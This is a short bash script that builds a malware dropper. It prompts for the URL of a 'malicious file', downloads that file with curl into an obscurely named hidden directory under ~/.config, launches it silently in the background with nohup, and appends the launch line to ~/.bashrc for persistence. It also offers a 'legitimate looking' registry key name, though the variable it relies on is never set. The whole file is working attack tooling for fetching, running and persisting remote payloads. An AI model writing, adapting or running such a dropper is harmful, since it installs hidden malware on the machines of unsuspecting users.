#!/bin/bash

# Asks basic questions for the dropper
read -p "file name? [Add the file type at the end of the name e.g. .bat, .exe, .py, .ps1, .txt] >> " name1
read -p "Whats the URL to the malicious file? [Replace dl=0 with dl=1 on the end of the dropbox link if your using dropbox] >> " droplink
read -p "do you want a legitimate looking registry key name? (Y/N) >> " rege

if [[ $rege =~ ^[Yy]$ ]]; then
    reges="${os_name}"
    echo "Registry key name = ${os_name}"
else
    reges="$name1"
    echo "Registry key name = $name1"
fi

# Sets all the specific needs for the scripts
target_dir="$HOME/.config/ifhoisudhifuhsiudhf"
exe_name="$name1"
full_path="$target_dir/$exe_name"
dropbox_url="$droplink"
Name="$name1"

# Makes the target directory
mkdir -p "$target_dir"

# Downloads the file from the URL
if curl -s --output "$full_path" "$dropbox_url"; then
    # Runs the script
    bash -c "nohup $full_path >/dev/null 2>&1 &"
    echo "Successfully ran $name1 at $full_path"
else
    echo "Error: script not found. Make sure you have an internet connection"
    exit 1
fi

# Adds persistence to the script
if ! grep -q "nohup $full_path >/dev/null 2>&1 &" "$HOME/.bashrc"; then
    echo "nohup $full_path >/dev/null 2>&1 &" >> "$HOME/.bashrc"
    echo "Successfully Installed $name1..."
else
    echo "Persistence already set for $name1..."
fi
